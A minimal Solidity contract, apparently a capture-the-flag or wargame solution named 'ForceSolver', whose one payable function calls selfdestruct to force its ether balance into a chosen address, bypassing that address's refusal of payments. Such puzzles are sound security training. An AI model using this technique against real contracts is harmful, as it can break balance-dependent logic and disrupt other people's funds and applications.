// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceSolver {
    function solve(address payable sendTo) payable public {
        selfdestruct(sendTo);
    }
}